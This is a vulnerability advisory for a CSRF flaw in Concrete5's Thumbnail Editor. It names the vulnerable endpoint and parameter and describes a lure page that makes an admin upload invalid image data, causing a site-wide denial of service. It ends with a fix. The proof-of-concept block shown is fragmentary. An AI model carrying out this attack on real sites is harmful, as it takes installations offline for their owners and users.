[+] Description:
Concrete5&#039;s Thumbnail Editor in the File Manager is vulnerable to CSRF, which allows remote attackers to disable the entire
installation of concrete5, by merely tricking an admin view a malicious page. This results in a site-wide denial of service
meaning neither the admin OR any of the website users can acccess the site.

-------------------------------------------------------------------------------------------------------------
[+] Summary:
The Thumbnail Editor function in the File Manager of Concrete5 allows an admin to change a thumbnail of a picture.
However, this function does not have any CSRF tokens / any other protection from CSRF, thus allowing an attacker to
make an admin upload a picture.

If the picture is invalid, the image processor will throw an error immediately and when the admin visits the File Manager,
a side-wide error will trigger, making the site unusable! (Example: http://archive.is/LZa5b)

The vulnerable parameter is &#039;imgData&#039; POST/GET param in &#039;http://[HOST]/index.php/tools/required/files/importers/imageeditor&#039;

So, in order to trigger this site-wide error, an attacker would first have to make the admin do 2 things.
1.) Make the admin upload an invalid image
2.) Make the admin visit the File Manager

I came up with a proof of concept to do just that ;)

[+] Proof of Concept:

 <script>alert("CSRF Triggered - Site-wide DoS now in effect!");</script>
 </center>

-------------------------------------------------------------------------------------------------------------

(Replace http://[HOST]/ with the URL of the Concrete5 installation you are targeting, upload the HTML somewhere, and get an admin to visit that page.)

The &#039;src&#039; tag uploads the invalid image data, and the onerror=this.src="" makes a new &#039;src&#039; tag and makes the admin visit the file manager,
which then triggers the site wide error.


[+] Test it! :
You can create a 1 hour demo of concrete5 for free (https://bitnami.com/launch/concrete5) & exploit it there!

-------------------------------------------------------------------------------------------------------------

[+] Fix / Patch:
Add CSRF tokens, and make sure the image processor first validates that the uploaded image is a valid picture.
